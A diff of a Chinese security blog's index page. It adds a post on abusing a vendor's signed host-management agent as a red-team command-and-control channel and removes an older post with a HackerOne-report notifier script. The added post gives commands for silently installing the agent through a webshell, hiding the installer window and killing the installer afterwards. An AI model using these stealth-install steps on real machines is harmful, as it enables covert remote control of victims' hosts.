@@ -255,6 +255,109 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/" class="post-title-link" itemprop="url">C2-牧云-长亭百川云平台</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-16 12:47:26 / 修改时间：12:48:17" itemprop="dateCreated datePublished" datetime="2023-06-16T12:47:26+08:00">2023-06-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="C2-牧云-长亭百川云平台"><a href="#C2-牧云-长亭百川云平台" class="headerlink" title="C2-牧云-长亭百川云平台"></a>C2-牧云-长亭百川云平台</h1><p>某厂商推出的主机管理系统用作红队C2（再次申明：Saas服务实名认证，请勿用于非法用途）。</p>
+<p>网上看到的一个思路，复现一下。其实也是很简单的第一个东西，主要是给人提供一种c2的思路而已，要学会举一反三。</p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>访问<a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/workbench%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%BC%80%E9%80%9A%E4%B8%BB%E6%9C%BA%E7%AE%A1%E7%90%86%E5%8A%A9%E6%89%8B">https://rivers.chaitin.cn/workbench，使用微信注册，免费开通主机管理助手</a></p>
+<p>登录到主机管理助手平台，点击绑定主机，即可选择Linux主机和Windows主机安装agent的命令，甚至还有针对于海外主机类型的海外链路，对于红队网络侧的基础设施搭建再也无需购买和部署域名和构建如CS那样的teamserver服务了。</p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616121932802.png" alt="image-20230616121932802"></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122015774.png" alt="image-20230616122015774"></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122234455.png" alt="image-20230616122234455"></p>
+<p>目前兼容 windows10，windows11，windows server 2019，windows server 2022，其他版本很快上线</p>
+<h2 id="安装agent"><a href="#安装agent" class="headerlink" title="安装agent"></a>安装agent</h2><p>agent大小差不多有30m，且需要管理员权限运行，但附带某亭签名！</p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122302400.png" alt="image-20230616122302400"></p>
+<p><strong>静默安装：</strong></p>
+<p>跟上文一样，很多场景是只有一个webshell command line或者远程命令执行，无交互式shell时进行点击安装步骤就显得很被动，而且installer并非msi程序，无法使用msiexec命令进行静默安装。</p>
+<p>经过后面测试，发现在终端运行installer.exe即可自动安装，得益于牧云自身的设计，无需点击任何确认或者下一步，即可将agent安装且自动运行。</p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122611931.png" alt="image-20230616122611931"></p>
+<p>可是当目标主机人员在使用的情况下突然弹出安装程序，未免有点小离谱了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start /min installer.exe</span><br><span class="line"></span><br><span class="line">powershell -WindowStyle Hidden -Command &quot;Start-Process -FilePath &#x27;installer.exe&#x27; -WindowStyle Hidden&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616123858753.png" alt="image-20230616123858753"></p>
+<p>安装完成后，需要点击Done，才能将安装程序退出，聪明的你应该已经想到如何解决了,当看到主机管理平台上线后使用，taskkill将安装进程干掉:</p>
+<p><code>taskkill /im installer.exe /F</code></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124135908.png" alt="image-20230616124135908"></p>
+<p>最后成功</p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124246703.png" alt="image-20230616124246703"></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124253558.png" alt="image-20230616124253558"></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124304561.png" alt="image-20230616124304561"></p>
+<p>值得一提的是，在管理端解绑主机之后，删除被控端会自己删除</p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124539803.png" alt="image-20230616124539803"></p>
+<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124610380.png" alt="image-20230616124610380"></p>
+<p>已经自己删除了，大概解绑之后的五六秒钟就会自己删除。</p>
+<h1 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h1><ul>
+<li>需要管理员权限进行安装</li>
+<li>windows 10以上版本</li>
+<li>Sass服务提供，懂得都懂，请合法合规使用</li>
+</ul>
+<p>大部分内容参考:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JlL4GWRFeIFgpRYx8OrdNg">https://mp.weixin.qq.com/s/JlL4GWRFeIFgpRYx8OrdNg</a></p>
+<p>主要是自己复现一下懒得写，有现成的文章为什么不复制呢（），也没有用作盈利嘛~</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/05/02/skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -408,83 +511,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="post-title-link" itemprop="url">监控hackone报告机器人</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-04-27 16:38:36 / 修改时间：16:40:54" itemprop="dateCreated datePublished" datetime="2023-04-27T16:38:36+08:00">2023-04-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="监控hackone报告机器人"><a href="#监控hackone报告机器人" class="headerlink" title="监控hackone报告机器人"></a>监控hackone报告机器人</h1><p>找了个机器人，分享一下脚本。使用方法就是</p>
-<ol>
-<li><p>创建钉钉机器人，选择自定义 WEBHOOK 类型，可通过自定义关键词或 IP 地址进行安全设置。创建完成后，复制机器人的 accesstoken。</p>
-</li>
-<li><p>将源代码中的 accesstoken 替换为您自己的，使用 Python3.8.X 在后台运行。您可以直接输入 <code>python3 h1_notifier.py</code> &amp; 或在 tmux 中运行。</p>
-<p>后续可能会过期无法使用，但是无所谓，我到时候再改就行。</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> feedparser</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">&#x27;script_output.log&#x27;</span>,</span><br><span class="line">                    level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CONFIG</span></span><br><span class="line">DINGTALK_WEBHOOK = <span class="string">&quot;https://oapi.dingtalk.com/robot/send?access_token=&quot;</span></span><br><span class="line">last_sent_tweet_pubdate = <span class="literal">None</span>  <span class="comment"># Add a global variable</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_link_description</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        meta_title_element = soup.find(<span class="string">&#x27;meta&#x27;</span>, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;description&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta_title_element <span class="keyword">and</span> <span class="string">&#x27;content&#x27;</span> <span class="keyword">in</span> meta_title_element.attrs:</span><br><span class="line">            description = meta_title_element[<span class="string">&#x27;content&#x27;</span>].replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            description = <span class="string">&#x27;No Description Found&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> description</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.info(<span class="string">f&quot;Error getting description for <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_dingtalk</span>(<span class="params">content, title</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;msgtype&quot;</span>: <span class="string">&quot;markdown&quot;</span>,</span><br><span class="line">        <span class="string">&quot;markdown&quot;</span>: &#123;<span class="string">&quot;title&quot;</span>: title, <span class="string">&quot;text&quot;</span>: content&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(DINGTALK_WEBHOOK, headers=headers, json=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_new_published_tweets</span>(<span class="params">feed, last_sent_tweet_pubdate</span>):</span></span><br><span class="line">    new_published_tweets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> feed.entries:</span><br><span class="line">        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> tweet_pubdate &gt; last_sent_tweet_pubdate:</span><br><span class="line">            new_published_tweets.append(entry)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_published_tweets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_tweet</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    <span class="comment"># random rss_url</span></span><br><span class="line">    random.shuffle(url_list)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        feed = feedparser.parse(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(feed.entries) &gt; <span class="number">0</span>:</span><br><span class="line">            new_published_tweets = get_new_published_tweets(feed, last_sent_tweet_pubdate)</span><br><span class="line">            <span class="keyword">if</span> new_published_tweets:</span><br><span class="line">                <span class="keyword">for</span> entry <span class="keyword">in</span> new_published_tweets:</span><br><span class="line">                    tweet_text = entry.title</span><br><span class="line">                    url_link = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                    <span class="keyword">if</span> url_link:</span><br><span class="line">                        <span class="comment"># Convert the link in the tweet to MarkDown format to support mobile access.</span></span><br><span class="line">                        tweet_text = tweet_text.replace(url_link.group(), <span class="string">f&quot;[<span class="subst">&#123;url_link.group()&#125;</span>](<span class="subst">&#123;url_link.group()&#125;</span>)&quot;</span>)</span><br><span class="line">                        logging.info(<span class="string">f&quot;RSS URL used: <span class="subst">&#123;url&#125;</span>, Latest tweet: <span class="subst">&#123;tweet_text[:<span class="number">30</span>]&#125;</span>, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">                        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">                        hackerone_url_match = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                        hackerone_url = hackerone_url_match.group()</span><br><span class="line">                        link_description = get_link_description(hackerone_url)</span><br><span class="line">                        <span class="keyword">if</span> link_description:</span><br><span class="line">                            content = <span class="string">f&quot;**Tweet:** \n\n<span class="subst">&#123;tweet_text&#125;</span>\n\n**Description:**\n\n <span class="subst">&#123;link_description&#125;</span>\n\n&quot;</span></span><br><span class="line">                            send_to_dingtalk(content, link_description)</span><br><span class="line">                        last_sent_tweet_pubdate = <span class="built_in">max</span>(last_sent_tweet_pubdate, tweet_pubdate) <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">else</span> tweet_pubdate</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.info(<span class="string">f&quot;Tweet does not contain hackerone.com, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.info(<span class="string">f&quot;Tweet has already been sent, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.info(<span class="string">&quot;Unable to get valid RSS data from all provided URLs.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    TWITTER_USER = <span class="string">&#x27;disclosedh1&#x27;</span></span><br><span class="line"></span><br><span class="line">    TWITTER_RSS_URLS = [</span><br><span class="line">        <span class="string">f&quot;https://nitter.net/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="comment">#f&quot;https://nitter.unixfox.eu/&#123;TWITTER_USER&#125;/rss&quot;,</span></span><br><span class="line">        <span class="string">f&quot;https://nitter.snopyta.org/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;https://twitter.owacon.moe/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">&quot;Checking for new tweets...&quot;</span>)</span><br><span class="line">    process_tweet(TWITTER_RSS_URLS)</span><br><span class="line">    </span><br><span class="line">    schedule.every(<span class="number">10</span>).minutes.do(process_tweet, TWITTER_RSS_URLS)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -556,7 +582,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
